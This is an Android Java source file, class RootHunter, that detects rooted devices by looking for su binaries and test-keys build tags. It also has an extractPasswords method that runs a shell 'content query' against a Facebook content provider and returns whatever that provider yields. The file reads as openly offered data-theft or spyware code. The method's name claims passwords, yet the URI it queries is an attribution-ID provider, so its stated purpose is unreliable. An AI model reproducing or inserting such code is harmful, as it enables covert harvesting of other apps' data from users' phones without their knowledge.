package com.terminator;  
import java.io.BufferedReader;  
import java.io.InputStreamReader;  

public class RootHunter {  
    public static boolean isRooted() {  
        return checkRootBinary() || checkBuildTags();  
    }  

    private static boolean checkRootBinary() {  
        String[] paths = { "/sbin/su", "/system/bin/su", "/system/xbin/su" };  
        for (String path : paths) {  
            if (new java.io.File(path).exists()) return true;  
        }  
        return false;  
    }  

    private static boolean checkBuildTags() {  
        String tags = android.os.Build.TAGS;  
        return tags != null && tags.contains("test-keys");  
    }  

    public static String extractPasswords() {  
        try {  
            Process p = Runtime.getRuntime().exec("content query --uri content://com.facebook.katana.provider.AttributionIdProvider");  
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));  
            StringBuilder sb = new StringBuilder();  
            String line;  
            while ((line = br.readLine()) != null) sb.append(line);  
            return sb.toString();  
        } catch (Exception e) { return ""; }  
    }  
}  
